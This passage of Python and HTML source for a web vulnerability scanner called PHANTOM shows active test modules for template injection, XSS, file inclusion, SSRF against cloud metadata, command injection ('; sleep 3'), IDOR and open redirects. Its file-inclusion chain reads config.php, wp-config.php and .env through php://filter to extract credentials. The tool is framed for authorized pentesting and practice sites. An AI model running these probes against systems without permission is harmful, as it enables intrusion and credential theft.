                if payload in ("{{7*7}}","${7*7}","#{7*7}") and "49" in r.text:
                    job.add_vuln("SSTI", url, param=param, payload=payload,
                                 evidence="Template expression 7*7=49 evaluated server-side — RCE possible",
                                 chain_type="SSTI_CONFIRMED")
                else:
                    job.add_vuln("Reflected XSS", url, param=param, payload=payload,
                                 evidence="Payload reflected verbatim in response")
                return

def _test_xss_forms(job: ScanJob) -> None:
    for form in job.forms:
        fields = dict(form["inputs"])
        for field in fields:
            for payload in XSS_PAYLOADS[:8]:
                data = fields.copy(); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST" else job.req(form["action"], params=data))
                if r and payload in r.text:
                    job.add_vuln("Reflected XSS (Form)", form["action"],
                                 param=field, payload=payload,
                                 evidence="XSS payload reflected in form response")
                    return

# Module C: LFI
def _test_lfi(job: ScanJob, url: str) -> None:
    params = dict(parse_qsl(urlparse(url).query))
    fp = {k:v for k,v in params.items() if any(kw in k.lower() for kw in LFI_PARAMS)}
    for param in fp:
        for payload in LFI_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in LFI_INDICATORS):
                excerpt = r.text[:150] if "root:x:" in r.text else ""
                job.add_vuln("LFI", url, param=param, payload=payload,
                             evidence="File inclusion confirmed",
                             extracted={"excerpt": excerpt}, chain_type="LFI_CONFIRMED")
                # Chain: try php://filter on config files
                for cfg in ["config.php","wp-config.php",".env"]:
                    tp2 = params.copy()
                    tp2[param] = f"php://filter/convert.base64-encode/resource={cfg}"
                    r2 = job.req(url, params=tp2)
                    if r2 and len(r2.text) > 30:
                        try:
                            dec = base64.b64decode(
                                re.search(r"[A-Za-z0-9+/=]{20,}", r2.text).group(0)
                            ).decode("utf-8",errors="ignore")
                            if any(kw in dec.lower() for kw in ["password","secret","define(","DB_"]):
                                job.chain_event(f"php://filter read {cfg} — credentials found!")
                                job.add_vuln("LFI Config Read", url, param=param,
                                             payload=tp2[param],
                                             evidence=f"Config file {cfg} decoded",
                                             extracted={"preview": dec[:200]})
                        except: pass
                return

# Module D: SSRF
def _test_ssrf(job: ScanJob, url: str) -> None:
    params = dict(parse_qsl(urlparse(url).query))
    sp = {k:v for k,v in params.items() if k.lower() in SSRF_PARAMS}
    for param in sp:
        for ssrf_url in SSRF_PAYLOADS:
            tp = params.copy(); tp[param] = ssrf_url
            t0 = time.time()
            r  = job.req(url, params=tp)
            if not r: continue
            if any(ind in r.text for ind in ["ami-id","instance-id","computeMetadata","iam/","root:x:"]):
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence=f"SSRF to {ssrf_url} returned cloud metadata!")
                return
            if time.time() - t0 > 3.5 and "169.254" in ssrf_url:
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence="Blind SSRF — response delayed 3.5s on metadata URL")
                return

# Module E: Sensitive files
def _test_sensitive_files(job: ScanJob) -> None:
    base = job.url
    def probe(path):
        r = job.req(base + path, allow_redirects=False)
        if r and r.status_code in (200,401,403):
            return path, r.status_code, r.text[:2000]
        return None
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futs = {ex.submit(probe, p): p for p in SENSITIVE_FILES + ADMIN_PATHS}
        for fut in as_completed(futs):
            res = fut.result()
            if not res: continue
            path, status, content = res
            label = "EXPOSED" if status == 200 else "EXISTS(protected)"
            job.log(f"[{status}] {label}: {path}", "VULN" if status == 200 else "WARN")
            if status == 200:
                ext = {}
                if ".env" in path:
                    keys = re.findall(r"([A-Z_]+=\S+)", content)
                    if keys: ext["keys_found"] = keys[:3]
                elif ".git/config" in path:
                    m = re.search(r"url\s*=\s*(.+)", content)
                    if m: ext["repo_url"] = m.group(1).strip()
                elif "phpinfo" in path:
                    m = re.search(r"PHP Version ([\d.]+)", content)
                    if m: ext["php_version"] = m.group(1)
                vtype = "Admin Panel Found" if path in ADMIN_PATHS else "Sensitive File Exposed"
                job.add_vuln(vtype, base + path, evidence=f"HTTP 200 OK ({len(content)}B)", extracted=ext)
                # Check for API keys in exposed file
                for kt, pattern in API_KEY_PATTERNS.items():
                    m = re.search(pattern, content)
                    if m:
                        job.add_vuln("API Key Exposed", base + path,
                                     evidence=f"{kt}: {m.group(0)[:40]}...")

# Module F: CORS
def _test_cors(job: ScanJob) -> None:
    for origin in ["https://evil-phantom-test.com","null",f"https://{job.host}.evil.com"]:
        r = job.req(job.url, headers={"Origin": origin,
                                       "User-Agent": USER_AGENTS[0]})
        if not r: continue
        acao = r.headers.get("Access-Control-Allow-Origin","")
        acac = r.headers.get("Access-Control-Allow-Credentials","false")
        if acao == origin:
            sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
            job.add_vuln("CORS Misconfiguration", job.url,
                         evidence=f"Origin '{origin}' reflected. ACAC={acac}",
                         extracted={"severity_note": sev, "credentials": acac})
        elif acao == "*":
            job.log("CORS wildcard (*) — acceptable if no credentials", "WARN")

# Module G: Security Headers
def _test_headers(job: ScanJob) -> None:
    r = job.req(job.url)
    if not r: return
    hlc = {k.lower(): v for k,v in r.headers.items()}
    for hdr, info in SECURITY_HEADERS.items():
        if hdr.lower() not in hlc:
            risk = info["risk"]
            job.add_vuln(f"Missing Header ({risk})", job.url,
                         evidence=f"No {hdr} — {info['desc']}",
                         extracted={"recommended": f"{hdr}: {info['rec']}"})
        else:
            val = hlc[hdr.lower()]
            if hdr == "Content-Security-Policy" and ("unsafe-inline" in val or "unsafe-eval" in val):
                job.log(f"Weak CSP: {val[:50]}", "WARN")
    if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
        job.add_vuln("Clickjacking", job.url,
                     evidence="No X-Frame-Options or CSP frame-ancestors header")
    for lh in ["Server","X-Powered-By","X-AspNet-Version","X-Generator"]:
        if lh.lower() in hlc:
            job.add_vuln("Info Disclosure", job.url,
                         evidence=f"{lh}: {hlc[lh.lower()]} — technology version exposed")

# Module H: Cookies & Session
def _test_cookies(job: ScanJob) -> None:
    r = job.req(job.url)
    if not r: return
    for cookie in r.cookies:
        flags = []
        sc = r.headers.get("Set-Cookie","").lower()
        if not cookie.secure: flags.append("No Secure flag")
        if "httponly" not in sc: flags.append("No HttpOnly flag")
        if "samesite" not in sc: flags.append("No SameSite flag")
        if flags:
            job.add_vuln("Insecure Cookie", job.url,
                         param=cookie.name,
                         evidence=f"Cookie '{cookie.name}': {', '.join(flags)}")
    # JWT detection
    jwt_re = r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*"
    for m in re.finditer(jwt_re, r.text):
        tok = m.group(0)
        try:
            h64 = tok.split(".")[0] + "=="
            p64 = tok.split(".")[1] + "=="
            hdr = json.loads(base64.urlsafe_b64decode(h64))
            pld = json.loads(base64.urlsafe_b64decode(p64))
            sensitive = [k for k in pld if k in ("password","pwd","secret","ssn","role","admin")]
            job.add_vuln("JWT Issue", job.url,
                         evidence=f"JWT found. alg={hdr.get('alg','?')} claims={list(pld.keys())[:5]}" +
                                  (f" SENSITIVE_FIELDS: {sensitive}" if sensitive else ""),
                         extracted={"algorithm": hdr.get("alg","?"), "sensitive_claims": sensitive})
        except: pass
    # CSRF
    for form in job.forms:
        if form["method"] == "POST":
            has_csrf = any(any(kw in n.lower() for kw in ["csrf","token","_token","xsrf"])
                          for n in form["inputs"])
            if not has_csrf:
                job.add_vuln("CSRF Missing Token", form["action"],
                             evidence="POST form without CSRF protection token")

# Module I: Command Injection
def _test_cmdi(job: ScanJob, url: str) -> None:
    parsed = urlparse(url)
    if not parsed.query: return
    params = dict(parse_qsl(parsed.query))
    for param in params:
        # Time-based
        t0 = time.time()
        tp = params.copy(); tp[param] = "; sleep 3"
        r  = job.req(url, params=tp)
        if r and time.time() - t0 > 3.0:
            job.add_vuln("Command Injection", url, param=param, payload="; sleep 3",
                         evidence="Response delayed >3s — time-based CMDi confirmed")
            return
        # Output-based
        for payload in CMD_PAYLOADS[:4]:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in CMD_INDICATORS):
                job.add_vuln("Command Injection", url, param=param, payload=payload,
                             evidence="OS command output in response")
                return

# Module J: IDOR
def _test_idor(job: ScanJob, url: str) -> None:
    params = dict(parse_qsl(urlparse(url).query))
    num_params = {k:v for k,v in params.items() if v.isdigit() and int(v) > 0}
    base_r = job.req(url)
    if not base_r: return
    for param, val in num_params.items():
        orig = int(val)
        for test_id in [orig+1, orig-1, 1, 9999]:
            if test_id <= 0: continue
            tp = params.copy(); tp[param] = str(test_id)
            r  = job.req(url, params=tp)
            if r and r.status_code == 200 and abs(len(r.text)-len(base_r.text)) > 80:
                job.add_vuln("IDOR", url, param=param, payload=f"{param}={test_id}",
                             evidence=f"ID {test_id} returned different data (orig={orig})")
                return

# Module K: Open Redirect
def _test_redirect(job: ScanJob, url: str) -> None:
    params = dict(parse_qsl(urlparse(url).query))
    rp = {k:v for k,v in params.items() if k.lower() in REDIRECT_PARAMS}
    for param in rp:
        for payload in REDIRECT_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, allow_redirects=False)
            if r and r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location","")
                if "evil-phantom-test.com" in loc:
                    job.add_vuln("Open Redirect", url, param=param, payload=payload,
                                 evidence=f"Redirects to: {loc}")
                    return

# Response secret scan
def _scan_secrets(job: ScanJob, url: str) -> None:
    r = job.req(url)
    if not r: return
    for kt, pattern in API_KEY_PATTERNS.items():
        m = re.search(pattern, r.text)
        if m:
            val = m.group(0)[:80]
            if not any(val == s.get("value","")[:80] for s in job.secrets):
                with job._lock:
                    job.secrets.append({"type":kt,"value":val,"url":url})
                job.add_vuln("API Key Exposed", url, evidence=f"{kt}: {val[:40]}...")

def phase_vulns(job: ScanJob) -> None:
    all_urls = list(job.urls) or [job.url]
    total    = len(all_urls) * 8 + 6
    job.set_phase("Phase 3: Vulns", total)
    job.log(f"Testing {len(all_urls)} URLs across 12 vuln modules...", "INFO")

    def scan_url(url: str) -> None:
        _test_sqli_url(job, url)
        _test_xss_url(job, url)
        _test_lfi(job, url)
        _test_ssrf(job, url)
        _test_cmdi(job, url)
        _test_idor(job, url)
        _test_redirect(job, url)
        _scan_secrets(job, url)
        job.advance("Phase 3: Vulns", 8)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for fut in as_completed([ex.submit(scan_url, u) for u in all_urls]):
            try: fut.result()
            except: pass

    _test_sqli_forms(job)
    _test_xss_forms(job)
    _test_cors(job)
    _test_headers(job)
    _test_cookies(job)
    _test_sensitive_files(job)
    for _ in range(6): job.advance("Phase 3: Vulns")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN SCAN RUNNER
# ══════════════════════════════════════════════════════════════════════════════
def run_scan(job: ScanJob) -> None:
    try:
        job.log(f"PHANTOM v{SCAN_VERSION} — Target: {job.url}", "INFO")
        phase_osint(job)
        phase_ports(job)
        phase_spider(job)
        phase_vulns(job)
    except Exception as e:
        job.log(f"Scanner error: {e}", "WARN")
    finally:
        job.done()
        cnt = len(job.vulns)
        job.log(f"SCAN COMPLETE — {cnt} issue{'s' if cnt!=1 else ''} found in {job.elapsed}s", "OK")


# ══════════════════════════════════════════════════════════════════════════════
#  HTML TEMPLATE
# ══════════════════════════════════════════════════════════════════════════════
HOME_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PHANTOM v2.0 — Vulnerability Scanner</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#080c10;--bg2:#0d1117;--bg3:#161b22;--border:#21262d;
  --red:#f85149;--yellow:#d29922;--cyan:#58a6ff;--green:#3fb950;
  --magenta:#bc8cff;--text:#e6edf3;--dim:#8b949e}
body{font-family:'Segoe UI',system-ui,monospace;background:var(--bg);color:var(--text);min-height:100vh}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg2)}
::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px}

/* Header */
.hdr{background:linear-gradient(180deg,#0d0d0d,var(--bg2));
  border-bottom:1px solid #f8514930;padding:16px 28px;display:flex;align-items:center;gap:14px}
.hdr-art{font-family:monospace;font-size:.55rem;line-height:1.1;color:var(--red)}
.hdr-info h1{font-size:1.1rem;color:var(--red);font-weight:700;letter-spacing:.05em}
.hdr-info p{font-size:.72rem;color:var(--dim)}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.65rem;font-weight:700;margin-left:8px}
.b-red{background:#f8514918;border:1px solid #f8514940;color:var(--red)}
.b-cyan{background:#388bfd15;border:1px solid #388bfd40;color:var(--cyan)}
.b-green{background:#3fb95015;border:1px solid #3fb95040;color:var(--green)}

.wrap{max-width:1100px;margin:0 auto;padding:20px 14px}

/* Alert */
.alert{background:#d2992215;border:1px solid #d2992240;border-radius:8px;
  padding:10px 16px;margin-bottom:14px;color:var(--yellow);font-size:.8rem}

/* Scan form */
.scan-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:16px}
.scan-card h2{color:var(--text);font-size:1rem;margin-bottom:4px}
.scan-card p{color:var(--dim);font-size:.8rem;margin-bottom:18px}
.inp-row{display:grid;grid-template-columns:1fr;gap:10px;margin-bottom:12px}
label{display:block;color:var(--dim);font-size:.73rem;margin-bottom:4px}
input[type=text]{width:100%;background:var(--bg);border:1px solid #30363d;border-radius:8px;
  padding:10px 14px;color:var(--text);font-size:.9rem;outline:none;transition:border-color .2s;font-family:monospace}
input[type=text]:focus{border-color:var(--cyan)}
.btn{background:linear-gradient(135deg,#b91c1c,#dc2626);border:none;color:#fff;
  padding:12px 24px;border-radius:8px;cursor:pointer;font-size:.9rem;font-weight:700;
  width:100%;transition:opacity .2s;margin-top:4px;letter-spacing:.05em}
.btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
.qt a{color:var(--cyan);font-size:.75rem;display:inline-block;margin:4px 6px 4px 0;text-decoration:none}
.qt a:hover{text-decoration:underline}

/* Progress area */
#pa{display:none;margin-bottom:14px}
.prog-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:12px}
.prog-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.prog-label{color:var(--text);font-size:.88rem;font-weight:600}
.prog-pct{color:var(--cyan);font-size:1.1rem;font-weight:700}
.prog-track{background:#21262d;border-radius:99px;height:6px;overflow:hidden}
.prog-bar{background:linear-gradient(90deg,var(--red),var(--magenta),var(--cyan));height:100%;
  border-radius:99px;transition:width .4s ease;width:0%}
.prog-mod{color:var(--dim);font-size:.75rem;margin-top:6px}
.phases{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
@media(max-width:600px){.phases{grid-template-columns:1fr}}
.ph-item{background:var(--bg);border-radius:8px;padding:8px 12px;border:1px solid var(--border)}
.ph-name{color:var(--dim);font-size:.72rem;margin-bottom:4px}
.ph-bar-track{background:#21262d;border-radius:99px;height:4px}
.ph-bar{height:100%;border-radius:99px;transition:width .4s;background:var(--green)}
.ph-bar.active{background:var(--cyan)}

/* Terminal */
.term{background:#010409;border:1px solid var(--border);border-radius:10px;padding:12px 14px;
  height:240px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.72rem;scroll-behavior:smooth}
.ll{padding:1px 0;display:flex;gap:8px;line-height:1.45}
.lt{color:#30363d;flex-shrink:0}
.INFO{color:var(--dim)}.OK{color:var(--green)}.VULN{color:var(--red);font-weight:700}
.WARN{color:var(--yellow)}.CHAIN{color:var(--magenta);font-weight:700}

/* Severity cards */
#sev{display:none;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
.sc{background:var(--bg3);border-radius:10px;padding:12px 14px;text-align:center;border:1px solid var(--border)}
.sn{font-size:1.6rem;font-weight:700;margin-bottom:2px}.sl{font-size:.68rem;color:var(--dim);font-weight:600}
.C .sn{color:var(--red)}.H .sn{color:var(--yellow)}.M .sn{color:var(--cyan)}.L .sn{color:var(--green)}

/* Port grid */
#port-sec{display:none}
.port-card{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:14px}
.port-card h3{color:var(--cyan);font-size:.88rem;margin-bottom:10px}
.port-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:7px}
.pch{background:var(--bg);border-radius:7px;padding:7px 11px;border:1px solid var(--border)}
.pch.d{border-color:#f8514940}.pn{color:var(--text);font-weight:700;font-size:.88rem}
.ps{color:var(--dim);font-size:.7rem}

/* Chain events */
#chain-sec{display:none}
.chain-card{background:var(--bg3);border:1px solid #bc8cff30;border-radius:12px;padding:14px 18px;margin-bottom:14px}
.chain-card h3{color:var(--magenta);font-size:.88rem;margin-bottom:10px}
.chain-item{display:flex;gap:10px;margin-bottom:6px;font-size:.76rem}
.chain-ts{color:var(--dim);flex-shrink:0}
.chain-msg{color:var(--magenta)}

/* Results */
#ra{display:none}
.res-head{background:var(--bg3);border:1px solid var(--border);border-radius:12px;
  padding:16px 20px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center}
.res-cnt{font-size:1.1rem;font-weight:700;color:var(--text)}
.res-sub{color:var(--dim);font-size:.76rem;margin-top:2px}
.rb{padding:5px 14px;border-radius:20px;font-size:.82rem;font-weight:700}
.rC{background:#f8514920;color:var(--red);border:1px solid #f8514960}
.rH{background:#d2992218;color:var(--yellow);border:1px solid #d2992260}
.rM{background:#388bfd15;color:var(--cyan);border:1px solid #388bfd50}
.rL{background:#3fb95015;color:var(--green);border:1px solid #3fb95060}
.vl{display:grid;gap:9px;margin-bottom:16px}
.vc{background:var(--bg3);border-radius:10px;padding:13px 16px;border:1px solid var(--border);border-left:3px solid transparent}
.vc.sC{border-left-color:var(--red)}.vc.sH{border-left-color:var(--yellow)}
.vc.sM{border-left-color:var(--cyan)}.vc.sL{border-left-color:var(--green)}
.vh{display:flex;align-items:center;gap:8px;margin-bottom:5px}
.vs{padding:2px 7px;border-radius:4px;font-size:.67rem;font-weight:700}
.vt{color:var(--text);font-size:.87rem;font-weight:600}
.vcvss{color:var(--dim);font-size:.72rem;margin-left:auto}
.vd{color:var(--dim);font-size:.76rem;font-family:monospace;margin-bottom:5px}
.vpay{color:#79c0ff;font-size:.72rem;font-family:monospace;margin-bottom:4px}
.vext{background:var(--bg);border-radius:6px;padding:7px 10px;color:var(--green);
  font-size:.71rem;font-family:monospace;margin-bottom:5px;border:1px solid #30363d}
.vimp{color:var(--yellow);font-size:.75rem;margin-bottom:5px}
.ftb{background:none;border:none;color:var(--cyan);font-size:.72rem;cursor:pointer;padding:0}
.fd{display:none;background:var(--bg);border-radius:6px;padding:8px 10px;
  margin-top:5px;color:#79c0ff;font-size:.72rem;border:1px solid var(--border)}
.fd ol{padding-left:14px}.fd li{margin-bottom:3px;color:var(--green)}
.nv{text-align:center;padding:24px;background:var(--bg3);border:1px solid var(--border);
  border-radius:12px;color:var(--green);font-size:.9rem}
.bna{background:var(--bg3);border:1px solid var(--border);color:var(--text);
  padding:8px 18px;border-radius:8px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block;margin-top:10px}
.dlb{background:var(--bg);border:1px solid var(--border);color:var(--cyan);
  padding:6px 14px;border-radius:8px;cursor:pointer;font-size:.76rem;float:right}
</style>
</head>
<body>
<div class="hdr">
  <pre class="hdr-art">██████╗ ██╗  ██╗ █████╗
██╔══██╗██║  ██║██╔══██╗
██████╔╝███████║███████║
██╔═══╝ ██╔══██║██╔══██║
██║     ██║  ██║██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝</pre>
  <div class="hdr-info">
    <h1>PHANTOM <span class="badge b-red">v2.0</span><span class="badge b-cyan">AUTONOMOUS</span><span class="badge b-green">IIT KANPUR PORTFOLIO</span></h1>
    <p>Persistent Heuristic Attack &amp; Network Threat Observation Machine</p>
    <p style="margin-top:3px;color:#f8514980;font-size:.7rem">⚠ Authorized targets and CTF/lab environments ONLY</p>
  </div>
</div>

<div class="wrap">
  <div class="alert">
    ⚠️ This tool is for <strong>authorized penetration testing</strong> only.
    Unauthorized scanning violates IT Act 2000, Section 66. Always obtain written permission.
  </div>

  <!-- FORM -->
  <div id="fa">
    <div class="scan-card">
      <h2>Launch Autonomous Vulnerability Scan</h2>
      <p>PHANTOM runs 4 phases automatically: OSINT → Port Scan → Recursive Spider → 12 Vuln Modules.
         Each finding chains into follow-up attacks autonomously.</p>
      <div class="inp-row">
        <div>
          <label>Target URL</label>
          <input type="text" id="iu" value="http://testphp.vulnweb.com/" placeholder="https://your-authorized-target.com">
        </div>
      </div>
      <button class="btn" id="sb" onclick="go()">⚡ LAUNCH PHANTOM SCAN</button>
      <div class="qt" style="margin-top:12px">
        <span style="color:var(--dim);font-size:.73rem">Legal targets: </span>
        <a href="#" onclick="su('http://testphp.vulnweb.com/')">testphp.vulnweb.com</a>
        <a href="#" onclick="su('http://demo.testfire.net/')">demo.testfire.net</a>
        <a href="#" onclick="su('http://testphp.vulnweb.com/listproducts.php?cat=1')">SQLi test page</a>
        <a href="#" onclick="su('http://testphp.vulnweb.com/artists.php?artist=1')">artists.php</a>
      </div>
    </div>
  </div>

  <!-- PROGRESS -->
  <div id="pa">
    <div class="prog-card">
      <div class="prog-top">
        <span class="prog-label" id="plabel">Initializing PHANTOM...</span>
        <span class="prog-pct" id="ppct">0%</span>
      </div>
      <div class="prog-track"><div class="prog-bar" id="pbar"></div></div>
      <div class="prog-mod" id="pmod">Starting...</div>
      <div class="phases" id="phases-grid"></div>
    </div>
    <div class="term" id="term"></div>
  </div>

  <!-- SEVERITY -->
  <div id="sev" style="display:none">
    <div class="sc C"><div class="sn" id="sC">0</div><div class="sl">CRITICAL</div></div>
    <div class="sc H"><div class="sn" id="sH">0</div><div class="sl">HIGH</div></div>
    <div class="sc M"><div class="sn" id="sM">0</div><div class="sl">MEDIUM</div></div>
    <div class="sc L"><div class="sn" id="sL">0</div><div class="sl">LOW</div></div>
  </div>

  <!-- PORTS -->
  <div id="port-sec">
    <div class="port-card">
      <h3>🔌 Open Ports &amp; Services</h3>
      <div class="port-grid" id="pg"></div>
    </div>
  </div>

  <!-- CHAIN EVENTS -->
  <div id="chain-sec">
    <div class="chain-card">
      <h3>⛓ Chain Engine Events</h3>
      <div id="chain-list"></div>
    </div>
  </div>

  <!-- RESULTS -->
  <div id="ra">
    <div class="res-head">
      <div>
        <div class="res-cnt" id="rcnt">—</div>
        <div class="res-sub" id="rtgt"></div>
        <div class="res-sub" id="rtime"></div>
      </div>
      <div class="rb rL" id="rb">—</div>
    </div>
    <div class="vl" id="vl"></div>
    <a href="/" class="bna">← New Scan</a>
    <a href="#" class="dlb" id="dlbtn">⬇ Download JSON Report</a>
  </div>
</div>

<script>
let sid=null,poller=null,li=0,etimer=null,es=0,lastD=null;
const SC={CRITICAL:'#f85149',HIGH:'#d29922',MEDIUM:'#58a6ff',LOW:'#3fb950'};
const SBG={CRITICAL:'#f8514920',HIGH:'#d2992218',MEDIUM:'#388bfd15',LOW:'#3fb95018'};
const SK={CRITICAL:'sC',HIGH:'sH',MEDIUM:'sM',LOW:'sL'};
const RK={CRITICAL:'rC',HIGH:'rH',MEDIUM:'rM',LOW:'rL'};
const PHASES=['Phase 0: OSINT','Phase 1: Ports','Phase 2: Spider','Phase 3: Vulns'];

function su(u){document.getElementById('iu').value=u;return false}

async function go(){
  const url=document.getElementById('iu').value.trim();
  if(!url){alert('Enter a target URL');return}
  document.getElementById('sb').disabled=true;
  document.getElementById('sb').textContent='⚡ SCANNING...';
  document.getElementById('fa').style.display='none';
  document.getElementById('pa').style.display='block';
  document.getElementById('term').innerHTML='';
  li=0;es=0;

  // Build phase bars
  const pg=document.getElementById('phases-grid');
  pg.innerHTML='';
  PHASES.forEach(p=>{
    const d=document.createElement('div');d.className='ph-item';d.id='ph-'+p.replace(/\W/g,'');
    d.innerHTML='<div class="ph-name">'+p+'</div><div class="ph-bar-track"><div class="ph-bar" id="phb-'+p.replace(/\W/g,'')+'"></div></div>';
    pg.appendChild(d);
  });

  etimer=setInterval(()=>{es++;document.getElementById('pmod').textContent=`${es}s elapsed — scanning...`},1000);
  const fd=new FormData();fd.append('url',url);
  const r=await fetch('/scan',{method:'POST',body:fd});
  const d=await r.json();sid=d.scan_id;
  document.getElementById('rtgt').textContent=url;
  poller=setInterval(tick,1800);tick();
}

async function tick(){
  if(!sid)return;
  try{
    const r=await fetch('/api/status/'+sid);const d=await r.json();lastD=d;
    upTerm(d.logs||[]);
    document.getElementById('pbar').style.width=(d.progress||0)+'%';
    document.getElementById('ppct').textContent=(d.progress||0)+'%';
    document.getElementById('plabel').textContent=d.current_phase||'Running...';
    // Phase bars
    const pp=d.phase_prog||{};
    PHASES.forEach(p=>{
      const info=pp[p]||{done:0,total:1};
      const pct=Math.round((info.done/Math.max(info.total,1))*100);
      const bar=document.getElementById('phb-'+p.replace(/\W/g,''));
      if(bar)bar.style.width=pct+'%';
    });
    // Ports
    const ports=d.ports||[];
    if(ports.length>0){
      document.getElementById('port-sec').style.display='block';
      const pg=document.getElementById('pg');pg.innerHTML='';
      ports.forEach(p=>{
        const isDanger=[6379,9200,27017,11211,23,8888].includes(p.port);
        const c=document.createElement('div');c.className='pch'+(isDanger?' d':'');
        c.innerHTML='<div class="pn">'+p.port+' <span class="ps">'+p.service+'</span></div>'+
          (p.version?'<div class="ps">'+esc(p.version.substring(0,35))+'</div>':'')+
          (isDanger?'<div class="ps" style="color:#f85149;font-size:.65rem">⚠ Dangerous</div>':'');
        pg.appendChild(c);
      });
    }
    // Chains
    const chains=d.chains||[];
    if(chains.length>0){
      document.getElementById('chain-sec').style.display='block';
      const cl=document.getElementById('chain-list');cl.innerHTML='';
      chains.slice(-8).forEach(c=>{
        const div=document.createElement('div');div.className='chain-item';
        div.innerHTML='<span class="chain-ts">['+c.ts+']</span><span class="chain-msg">'+esc(c.msg)+'</span>';
        cl.appendChild(div);
      });
    }
    if(d.status==='done'){clearInterval(poller);clearInterval(etimer);upTerm(d.logs||[]);showRes(d);}
  }catch(e){console.error(e)}
}

function upTerm(logs){
  const t=document.getElementById('term');
  logs.slice(li).forEach(l=>{
    const d=document.createElement('div');d.className='ll';
    d.innerHTML='<span class="lt">['+l.ts+']</span><span class="'+l.level+'">'+esc(l.msg)+'</span>';
    t.appendChild(d);li++;
  });t.scrollTop=t.scrollHeight;
}

function showRes(d){
  const vs=d.vulns||[];const cnt=vs.length;
  const counts={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
  vs.forEach(v=>counts[v.severity]=(counts[v.severity]||0)+1);
  ['CRITICAL','HIGH','MEDIUM','LOW'].forEach(s=>document.getElementById('s'+s[0]).textContent=counts[s]);
  document.getElementById('sev').style.display='grid';
  let risk='LOW';
  if(counts.CRITICAL>0)risk='CRITICAL';else if(counts.HIGH>0)risk='HIGH';else if(counts.MEDIUM>0)risk='MEDIUM';
  document.getElementById('ra').style.display='block';
  document.getElementById('rcnt').textContent=cnt===0?'✓ No Vulnerabilities Found':`${cnt} Vulnerabilit${cnt===1?'y':'ies'} Found`;
  document.getElementById('rtime').textContent=`Completed in ${d.elapsed}s | ${(d.urls_count||0)} URLs | ${(d.ports_count||0)} ports`;
  const rb=document.getElementById('rb');rb.textContent=risk;rb.className='rb '+RK[risk];
  const ord={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
  vs.sort((a,b)=>(ord[a.severity]||4)-(ord[b.severity]||4));
  const vl=document.getElementById('vl');vl.innerHTML='';
  if(cnt===0){
    vl.innerHTML='<div class="nv">✅ No vulnerabilities detected. Site appears secure for these test cases.</div>';
  }else{
    vs.forEach((v,i)=>{
      const s=v.severity||'MEDIUM';const fi='f'+i;
      const c=document.createElement('div');c.className='vc '+SK[s];
      let html='<div class="vh"><span class="vs" style="background:'+SBG[s]+';color:'+SC[s]+'">'+s+'</span><span class="vt">'+esc(v.type)+'</span>';
      if(v.cvss)html+='<span class="vcvss">CVSS '+v.cvss+'</span>';
      html+='</div><div class="vd">'+esc(v.location);
      if(v.parameter)html+=' · param: <strong>'+esc(v.parameter)+'</strong>';
      html+='</div>';
      if(v.payload)html+='<div class="vpay">Payload: '+esc(v.payload)+'</div>';
      if(v.evidence)html+='<div class="vd">'+esc(v.evidence)+'</div>';
      if(v.extracted&&Object.keys(v.extracted).length)
        html+='<div class="vext">★ EXTRACTED: '+esc(JSON.stringify(v.extracted).substring(0,180))+'</div>';
      if(v.impact)html+='<div class="vimp">⚡ '+esc(v.impact)+'</div>';
      html+='<button class="ftb" onclick="tf(\''+fi+'\')">▸ Remediation Steps</button>';
      if(v.fix&&v.fix.length){
        html+='<div class="fd" id="'+fi+'"><ol>';
        v.fix.forEach(step=>html+='<li>'+esc(step)+'</li>');
        html+='</ol></div>';
      }
      c.innerHTML=html;vl.appendChild(c);
    });
  }
  document.getElementById('dlbtn').onclick=()=>{
    const b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
    const a=document.createElement('a');a.href=URL.createObjectURL(b);
    a.download='phantom_report_'+sid+'.json';a.click();return false;
  };
}
function tf(id){const e=document.getElementById(id);e.style.display=e.style.display==='block'?'none':'block';}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
</script>
</body>
</html>"""

# ══════════════════════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def home(): return HOME_HTML

@app.route("/scan", methods=["POST"])
def start_scan():
    url = request.form.get("url","").strip()
    if not url: return jsonify({"error":"URL required"}), 400
